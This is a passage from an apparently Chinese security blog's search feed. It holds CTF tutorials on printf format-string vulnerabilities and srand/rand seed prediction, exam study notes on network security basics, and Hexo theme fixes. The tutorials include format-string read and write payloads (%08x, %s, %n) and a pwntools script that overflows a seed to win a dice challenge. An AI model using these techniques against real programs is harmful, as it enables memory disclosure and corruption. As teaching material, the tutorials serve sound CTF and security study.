703bd72c46aaf13ee898068969518ab9a1c2b51710c0362ea9276f3f0d6dcee35aac1146deeda61b2c323687ae5f2191dcfc72860708dcd2df9284e0b96ed384c82305daf9dd9f61c0d08f33da486af5e60e091029aa5e27ef33367ab22472429645cba7a6088772755f45297d2102f585b91c2e4bce918d2b2a4e8c5a8a54e1940f777e749940c28b277ffd7bd707cd04897a0f5f4337a17ebad5cb24e2a249038e489994dd2b4500997ffa3137b8a54de6c7f336866488d68bd949db7971fdde5ab9912b83829eff503727a6fa742d749edc0f481ff3e8ad7eb854413175b12a95b366f290ca5e9be7b880f8c078fbe061d1e2fe9df4267df79359f2860c6a90d83f196cc6d94a27b7158b15600ba2903313fe621c18ca9f609a6640b79a8580ec8c4852145d31c71222ef4e21829ba2975f54d7f8a317af9c44d7c7cf662831ee1b268d808a54b4ebce3faef814e2294939df086a0a84b2fac4486eb0e07894785b7a9fc774c94e037786862d0c270785dcb8c1439dfa0d3bd26bcfe9538cdd9c84885fe3a30984fe7fdbb0df3eac46f8c3a610198e460242d92d393ac6c6294ecf7e670f3d4173ec2f2b4ee61835cbfbac1a1769da9eeb7a0962bee77257ca6a7d9d2552eadde0ca12984397a327407db537e14c35e19ddebf55d867b2c349c2a6b914dc4591c390df59652bd562507073335ed1022e31541dcab47f6b6d1f65dec9a9c9b63a99cf78661fbe03405296e18a8be94325004b71295edd501b95ade18dd01f4c18b76ecd00f7b93f08a81d6de2afb320705f748e7280c0290c708de0ae491898188a0a5ecc4a8a73871f505f2776b396255d3eab0de6dc0201fb35ce5fb4aef0653df8cccc24f9b0a4f5aecaa4da245c8052f8aa1de9f9b5cd76955a0b33f0315e4b6778aaca3695298c23f1f2a52fb01bf4032c38135f716a6c929a8231b8aeb8376c207811edf3e12c40864c72ab33f60fd45b60a2ff3d79c1129d659e60bb8e1e97b2e90009509f7efdf56180f951525a9d983cd7c6e98ac20a4b44d63751d6971c767188cb10fd4d48f38da36f5d0d3a2024d7e086ad2b8b60dab5</script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>密码找回</tag>
      </tags>
  </entry>
  <entry>
    <title>PWN中格式化字符串漏洞</title>
    <url>/2020/09/03/PWN%E4%B8%AD%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>哈哈哈，太懒了，时隔一年半又来更新博客了。</p>
<p><img src="/2020/09/03/PWN%E4%B8%AD%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/%E8%84%B8.jpg"></p>
<a id="more"></a>

<h1 id="0x01-漏洞原理"><a href="#0x01-漏洞原理" class="headerlink" title="0x01 漏洞原理"></a>0x01 漏洞原理</h1><p>最近做pwn的练习，发现格式化字符串漏洞会经常遇到，不太理解，只能抽出时间来研究一下这古老的漏洞。</p>
<p>首先，我们来看一下常见的样式，（题目为“攻防世界”的string）ida反编译后在某个函数中看到如下的代码：</p>
<p><img src="/2020/09/03/PWN%E4%B8%AD%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/string%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2.png"></p>
<p>通常使用printf函数，根据cdcel调用约定，从右到左逐个压栈，如果传入字符串，则压入该字符串指针。由于printf无法知道被调用之前有多少参数被压入栈中，所以需要使用format参数用以指定到底有多少参数。</p>
<p><strong>format类型</strong></p>
<table>
<thead>
<tr>
<th align="center">参数</th>
<th align="center">表示</th>
</tr>
</thead>
<tbody><tr>
<td align="center">%d</td>
<td align="center">表示输出十进制整数</td>
</tr>
<tr>
<td align="center">%n</td>
<td align="center">输出所有打印的字符数</td>
</tr>
<tr>
<td align="center">%x</td>
<td align="center">输出十六进制数</td>
</tr>
<tr>
<td align="center">%s</td>
<td align="center">从内存中读取字符串</td>
</tr>
<tr>
<td align="center">%p</td>
<td align="center">显示一个指针</td>
</tr>
</tbody></table>
<p><strong># 特性一： printf()函数的参数个数不固定</strong></p>
<p>当我们写作printf(str)时，此时参数可控，我们在控制了format参数之后结合printf()函数的特性就可以进行相应的攻击。</p>
<p>当我们输入format参数大于存在参数时，printf会读取内存内的数据，如图</p>
<p><img src="/2020/09/03/PWN%E4%B8%AD%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/printf%E8%AF%BB%E5%8F%96%E5%86%85%E5%AD%98.jpg"></p>
<p>此时我们只有3个参数，而我们使用printf(“%s %d %d %d %x\n”,buf,a,b，c)读取时，需要读取4个数据，此时便会读取到下一个地址的内容。</p>
<p>以下例进行分析</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> str[<span class="number">200</span>];</span><br><span class="line">    fgets(str,<span class="number">200</span>,<span class="built_in">stdin</span>);</span><br><span class="line">    <span class="built_in">printf</span>(str);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当我们在fgets时输入AAAA%08x%08x%08x%08x%08x%08x（%08x为格式化为8位16进制数，左对齐，空位补0），调用printf时输出数值时便会读取到内存中的0x41414141（A的16进制为0x41），输出结果为AAAA000000c8b7fc1c20b7e25438080482100000000141414141。</p>
<p>如果我们将AAAA修改为某一敏感地址，使用%s读取地址里面的数据，如读取0x41414141地址的数据<code>\x41\x41\x41\x41%08x%08x%08x%08x%08x%s</code></p>
<p><strong># 特性二：利用%n格式符写入数据</strong></p>
<p>%n的作用是把前面已经打印的长度写入某个内存地址，（同一个printf中的输出长度）</p>
<p>如下代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> num=<span class="number">66666666</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Before: num = %d\n&quot;</span>, num);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d%n\n&quot;</span>, num, &amp;num);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;After: num = %d\n&quot;</span>, num);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此时%n成功修改了num的值，输出结果为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Before: num &#x3D; 66666666</span><br><span class="line">66666666</span><br><span class="line">After: num &#x3D; 8</span><br></pre></td></tr></table></figure>

<p><strong># 特性三：自定义打印字符串宽度</strong></p>
<p>此时我们修改<code>printf(&quot;%d%n\n&quot;, num, &amp;num);</code>为<code>printf(&quot;%100d%n\n&quot;, num, &amp;num);</code>时，最终num输出为100。若改为%.100d或%0100d，则会在6之前输出92个0。</p>
<p>当我们要把0x8048000地址写入内存时，此时，我们可以使用如下方式</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%.134512640d%n\n&quot;</span>, num, &amp;num);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;After: num = %x\n&quot;</span>, num);</span><br></pre></td></tr></table></figure>



<p>此外还需要$的配合，如下的代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;7th: %7$d, 4th: %4$05d\n&quot;</span>, <span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>, <span class="number">40</span>, <span class="number">50</span>, <span class="number">60</span>, <span class="number">70</span>, <span class="number">80</span>);</span><br></pre></td></tr></table></figure>

<p>会打印输出</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">7th: 70, 4th: 00040</span><br></pre></td></tr></table></figure>

<p>即%7$d 获取的将是参数列表中第7个元素的值，%4$05d 获取的是第四个参数的值，且有效位长度是5。</p>
<h1 id="0x02-其他相关"><a href="#0x02-其他相关" class="headerlink" title="0x02 其他相关"></a>0x02 其他相关</h1><p>在Stack中Canary found绕过问题：</p>
<p>系统产生一个随机数，在程序开始和结尾时会进行检查，如果发生改变就会抛出异常。</p>
<p><img src="/2020/09/03/PWN%E4%B8%AD%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/cancary.jpg"></p>
<p>某些题目需要将其先泄漏出来，再填充到结束的位置</p>
<h1 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h1><p><a href="http://drops.xmd5.com/static/drops/papers-9426.html">漏洞挖掘基础之格式化字符串</a></p>
<p><a href="https://kevien.github.io/2018/04/07/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/">格式化字符串漏洞</a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>PWN中伪随机数问题--srand()/rand()</title>
    <url>/2020/09/07/PWN%E4%B8%AD%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E9%97%AE%E9%A2%98-srand-rand/</url>
    <content><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>PWN中通常使用srand()和rand()配合使用来设置伪随机数。通常当我们输入的数可以覆盖到srand()中的值时，我们可以预测rand()产生固定序列。</p>
<a id="more"></a>

<h1 id="0x01-关于rand-和sand"><a href="#0x01-关于rand-和sand" class="headerlink" title="0x01 关于rand()和sand()"></a>0x01 关于rand()和sand()</h1><h2 id="rand"><a href="#rand" class="headerlink" title="rand()"></a>rand()</h2><p>rand()函数是使用线性同余法生成随机数，因为其周期特别长，所以在一定范围内可以看成随机的。但每次生成都是固定的序列</p>
<p>我们使用如下代码生成10个随机数：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; rand() &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此时查看运行结果，多次运行结果一样。</p>
<img src="/2020/09/07/PWN%E4%B8%AD%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E9%97%AE%E9%A2%98-srand-rand/rand运行.png" style="zoom:50%;">

<h2 id="srand"><a href="#srand" class="headerlink" title="srand()"></a>srand()</h2><p>srand()为初始化随机数发生器，用于设置rand()产生随机数时的种子。传入的参数seed为unsigned int类型，通常我们会使用时间time(NULL)或time(0)作为seed。当我们不设置srand()时，将默认为srand(1)。如果我们设置某个固定的seed，那么虽然在同一次运行时，会有不同的随机数产生，但是对于这段程序的多次运行所得到的结果是不变的。如下代码：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		srand(<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; rand() &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>结果如图：</p>
<img src="/2020/09/07/PWN%E4%B8%AD%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E9%97%AE%E9%A2%98-srand-rand/srand为2.png" style="zoom:50%;">

<h1 id="0x02-简单示例"><a href="#0x02-简单示例" class="headerlink" title="0x02 简单示例"></a>0x02 简单示例</h1><p><strong>攻防世界–dice_game</strong></p>
<p>我们直接拖入ida看源码</p>
<img src="/2020/09/07/PWN%E4%B8%AD%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E9%97%AE%E9%A2%98-srand-rand/dice-game.png" style="zoom:80%;">

<p>由于我们可以覆盖seed，所以再输入payload时，将seed设置为1.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&#x27;A&#x27;</span>*<span class="number">0x40</span> + p64(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>此时，我们就直接使用给出的libc来自动计算随机数</p>
<p>python脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">p = remote(IP，port)</span><br><span class="line"></span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line">libc.srand(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span> * <span class="number">64</span> + p64(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Welcome, let me know your name: &#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">50</span>):</span><br><span class="line">    payload = str(libc.rand() % <span class="number">6</span> + <span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Give me the point(1~6): &#x27;</span>,payload)</span><br><span class="line">    </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><strong>ctypes包的cdll.LoadLibrary(‘libc.so.xxx’)可以在在脚本中加载动态库，同时又能调用库中的函数。</strong></p>
<h1 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h1><p><a href="https://blog.csdn.net/u013745804/article/details/82379266">关于rand()和srand()</a></p>
<p><a href="https://blog.csdn.net/weixin_39194641/article/details/103089862">CTF中的PWN——srand()/rand()漏洞（栈溢出）</a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>2020年软考--信息安全工程师学习笔记</title>
    <url>/2020/09/09/2020%E5%B9%B4%E8%BD%AF%E8%80%83-%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>2020年准备报考信息安全工程师，8月底出了《信息安全工程师教程（第2版）》，原来8大章节变成了26章（？？？），考试出题也以新版教程和大纲出题。</p>
<p><img src="/2020/09/09/2020%E5%B9%B4%E8%BD%AF%E8%80%83-%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E9%BB%91%E4%BA%BA%E9%97%AE%E5%8F%B7.jpeg"></p>
<a id="more"></a>

<p><strong>不定期更新</strong></p>
<p><a href="https://fl4g.cn/2020/09/09/%E7%AC%AC1%E7%AB%A0-%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%A6%82%E8%BF%B0/">第1章 网络信息安全概述</a></p>
<p>推荐看信管网最新解读视频：</p>
<p><a href="https://www.cnitpm.com/shipin/play.aspx?id=218">信息安全工程师教程（第2版）解读视频</a></p>
]]></content>
      <categories>
        <category>信息安全工程师软考</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>第1章 网络信息安全概述</title>
    <url>/2020/09/09/%E7%AC%AC1%E7%AB%A0-%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%A6%82%E8%BF%B0/</url>
    <content><![CDATA[<h1 id="网络信息安全基本属性"><a href="#网络信息安全基本属性" class="headerlink" title="网络信息安全基本属性"></a>网络信息安全基本属性</h1><ul>
<li><p>机密性：信息不被未授权者知晓的属性</p>
</li>
<li><p>完整性： 信息或系统未授权则不能被篡改</p>
</li>
<li><p>可用性： 信息或服务可以随时被合法用户正常使用</p>
<a id="more"></a>
</li>
<li><p>抗抵赖性： 防止网络信息系统相关用户否认其活动行为</p>
</li>
<li><p>可控性： 管理者对系统能够进行有效的掌握和控制</p>
</li>
<li><p>其他</p>
<ul>
<li>真实性： 信息和客观事实保持一致</li>
<li>时效性： 信息、服务及系统满足时间约束要求</li>
<li>合规性： 信息、服务及系统符合法律政策规范的要求</li>
<li>公平性： 相关主体处于同等地位处理相关任务</li>
<li>可靠性： 信息系统能有效完成预定功能</li>
<li>可生存性： 信息系统在受损情况下能最小化支撑业务运行</li>
<li>隐私性： 敏感信息不对外公开</li>
</ul>
</li>
</ul>
<h1 id="网络信息安全基本功能"><a href="#网络信息安全基本功能" class="headerlink" title="网络信息安全基本功能"></a>网络信息安全基本功能</h1><ol>
<li>网络信息安全防御</li>
<li>网络信息安全监测</li>
<li>网络信息安全应急</li>
<li>网络信息安全恢复</li>
</ol>
<h1 id="网络信息安全基本技术需求"><a href="#网络信息安全基本技术需求" class="headerlink" title="网络信息安全基本技术需求"></a>网络信息安全基本技术需求</h1><ol>
<li>物理环境安全： 环境、设备、存储介质安全</li>
<li>网络信息安全认证：实现网络资源访问控制的前提和依据</li>
<li>网络信息访问控制： 限制非法用户，防止越权</li>
<li>网络信息安全保密： 安全隔离，防止敏感信息泄露</li>
<li>网络信息安全漏洞扫描</li>
<li>恶意代码防护</li>
<li>网络信息内容安全： 信息符合法律法规</li>
<li>网络信息安全监测与预警</li>
<li>网络信息安全应急响应</li>
</ol>
<h1 id="网络信息安全管理内容与方法"><a href="#网络信息安全管理内容与方法" class="headerlink" title="网络信息安全管理内容与方法"></a>网络信息安全管理内容与方法</h1><p><strong>相关技术：</strong></p>
<p>风险分析、密码算法、身份认证、访问控制、安全审计、漏洞扫描、防火墙、入侵检测和应急响应</p>
<p><strong>网络安全管理方法：</strong></p>
<p>风险管理、等级保护、纵深防御、层次化保护、应急响应以及PDCA（Plan-Do-Check-Act）</p>
<p><strong>网络安全管理要素</strong></p>
<ol>
<li>管理对象： 硬件、软件、存储介质、网络信息资产、支持保障系统</li>
<li>网络信息安全威胁：属性分类（自然威胁和人为威胁），威胁对象分类（物理、网络通信、网络服务、网络管理等威胁）</li>
<li>网络信息安全脆弱性： 与安全策略相冲突的状态或错误</li>
<li>网络信息安全风险： 网络威胁发生概率和所造成影响的乘积</li>
</ol>
<blockquote>
<p>风险控制方法：</p>
<ul>
<li>避免风险。例如,通过物理隔离设备将内部网和外部网分开,避免受到外部网的攻击。</li>
<li>转移风险。例如,购买商业保险计划或安全外包。</li>
<li>减少威胁。例如,安装防病毒软件包,防止病毒攻击。</li>
<li>消除脆弱点。例如,给操作系统打补丁或强化工作人员的安全意识。</li>
<li>减少威胁的影响。例如,采取多条通信线路进行备份或制定应急预案。</li>
<li>风险监测。例如,定期对网络系统中的安全状况进行风险分析,监测潜在的威胁行为。</li>
</ul>
</blockquote>
<ol start="5">
<li>网络信息安全保护措施： 目的是对网络管理对象进行风险控制</li>
</ol>
<p><strong>网络信息安全管理流程</strong></p>
<p>​    步骤1，确定网络信息安全管理对象</p>
<p>​    步骤2，评估网络信息安全管理对象的价值</p>
<p>​    步骤3，识别网络信息安全管理对象的威胁</p>
<p>​    步骤4，识别网络信息安全管理对象的脆弱性</p>
<p>​    步骤5，确定网络信息安全管理对象的风险级别</p>
<p>​    步骤6，制定网络信息安全防范体系及防范措施</p>
<p>​    步骤7，实施和落实网络信息安全防范措施</p>
<p>​    步骤8，运行/维护网络信息安全设备、配置</p>
<p><img src="/2020/09/09/%E7%AC%AC1%E7%AB%A0-%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%A6%82%E8%BF%B0/%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F.jpg"></p>
<p><strong>网络安全管理工具</strong></p>
<p>SOC、IT资产管理系统、网络安全态势感知系统、漏洞扫描器、协议分析器、上网行为管理等</p>
<p><strong>网络信息安全管理评估</strong></p>
<ul>
<li>网络安全等级保护</li>
<li>信息安全管理体系认证（ISMS）：依据：GB/T22080、ISO/IEC27001</li>
<li>系统安全工程能力成熟度模型（SSE-CMM）：组织过程、工程过程、项目过程来评价系统安全能力</li>
</ul>
<h1 id="网络信息安全法律与政策文件"><a href="#网络信息安全法律与政策文件" class="headerlink" title="网络信息安全法律与政策文件"></a>网络信息安全法律与政策文件</h1><p>《中华人民共和国密码法》于2020年1月1日起实施。</p>
<p><strong>网络安全等级保护</strong></p>
<p>工作：定级、备案、建设整改、等级测评、运营维护。</p>
<p>保护义务：</p>
<ul>
<li>制定内部安全管理制度和操作规程，确定网络安全负责人，落实网络安全保护责任；</li>
<li>采取防范计算机病毒和网络攻击、网络侵入等危害网络安全行为的技术措施；</li>
<li>采取监测、记录网络运行状态、网络安全事件的技术措施，并按照规定留存相关的网络日志不少于六个月；</li>
<li>采取数据分类、重要数据备份和加密等措施；</li>
<li>法律、行政法规规定的其他义务。</li>
</ul>
<p><strong>网络产品和服务审查</strong></p>
<p>安全审查和认证机构：中国网络安全审查技术与认证中心（CCRC）</p>
<p><strong>网络安全产品管理</strong></p>
<p>由测评机构进行测评。</p>
<p>国家保密科技测评中心、中国信息安全认证中心、国家网络与信息系统安全产品质量监督检验中心、公安部计算机信息系统安全产品质量监督检验中心等。</p>
<p><strong>个人信息与重要数据保护制度</strong></p>
<p><img src="/2020/09/09/%E7%AC%AC1%E7%AB%A0-%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%A6%82%E8%BF%B0/%E6%95%B0%E6%8D%AE%E4%BF%9D%E6%8A%A4.jpg"></p>
<p><strong>网络安全标准规范与测评</strong></p>
<p>标准化工作组织：全国信息安全标准化技术委员会</p>
<p><strong>网络安全事件与应急响应制度</strong></p>
<p>国家应急中心：国际计算机网络应急技术处理协调中心（CNCERT）</p>
<h1 id="网络信息安全科技信息获取"><a href="#网络信息安全科技信息获取" class="headerlink" title="网络信息安全科技信息获取"></a>网络信息安全科技信息获取</h1><p><strong>网络信息安全会议</strong></p>
<p>四大顶级学术会议：S&amp;P、CCS、NDSS、USENIX Security</p>
<p>USENIX Security被中国计算机学会（CCF）归为“网络与信息安全”A类会议。</p>
]]></content>
      <categories>
        <category>信息安全工程师软考</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>第2章 网络攻击原理与常用方法</title>
    <url>/2020/09/10/%E7%AC%AC2%E7%AB%A0-%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86%E4%B8%8E%E5%B8%B8%E7%94%A8%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<h1 id="网络攻击概述"><a href="#网络攻击概述" class="headerlink" title="网络攻击概述"></a>网络攻击概述</h1><h2 id="网络攻击概念"><a href="#网络攻击概念" class="headerlink" title="网络攻击概念"></a>网络攻击概念</h2><p>常见的危害行为：</p>
<ul>
<li>信息泄露攻击</li>
<li>完整性破坏攻击</li>
<li>拒绝服务攻击</li>
<li>非法使用攻击</li>
</ul>
<a id="more"></a>

<p><img src="/2020/09/10/%E7%AC%AC2%E7%AB%A0-%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86%E4%B8%8E%E5%B8%B8%E7%94%A8%E6%96%B9%E6%B3%95/%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86.jpg"></p>
<h2 id="网络攻击模型"><a href="#网络攻击模型" class="headerlink" title="网络攻击模型"></a>网络攻击模型</h2><ol>
<li>攻击树模型：进行费效或概率分析，建模复杂场景；不能建模循环事件。</li>
<li>MITRE ATT&amp;CK模型：</li>
</ol>
]]></content>
      <categories>
        <category>信息安全工程师软考</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo及next主题使用问题记录</title>
    <url>/2020/09/11/hexo%E5%8F%8Anext%E4%B8%BB%E9%A2%98%E4%BD%BF%E7%94%A8%E9%97%AE%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p><strong>不定期更新各类使用过程中遇到的问题</strong></p>
<a id="more"></a>

<h1 id="Next7-8"><a href="#Next7-8" class="headerlink" title="Next7.8"></a>Next7.8</h1><ol>
<li>点击“阅读全文”后，会直接滚动到原文中&lt;!– more –&gt;下，且config里面没有scroll_to_more配置，如何从头开始阅读。</li>
</ol>
<p>参考博文<a href="https://blog.csdn.net/weizhixiang/article/details/105112467">hexo关于next主题scroll_to_more失效</a>进行如下设置</p>
<p>修改\themes\next\layout_macro\post.swig中</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;btn&quot;</span> <span class="attr">href</span>=<span class="string">&quot;&#123;&#123; url_for(post.path) &#125;&#125;#more&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;contents&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>为</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;btn&quot;</span> <span class="attr">href</span>=<span class="string">&quot;&#123;&#123; url_for(post.path) &#125;&#125;&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;contents&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ol start="2">
<li>更改布局时hexo s报错</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Asset render failed: %s css&#x2F;main.css</span><br></pre></td></tr></table></figure>

<p>删除指定文件theme/next/source/css/main.css就好了</p>
<p><img src="/2020/09/11/hexo%E5%8F%8Anext%E4%B8%BB%E9%A2%98%E4%BD%BF%E7%94%A8%E9%97%AE%E9%A2%98%E8%AE%B0%E5%BD%95/main%E5%B8%83%E5%B1%80.png"></p>
]]></content>
      <categories>
        <category>hero</category>
      </categories>
      <tags>
        <tag>next</tag>
      </tags>
  </entry>
</search>
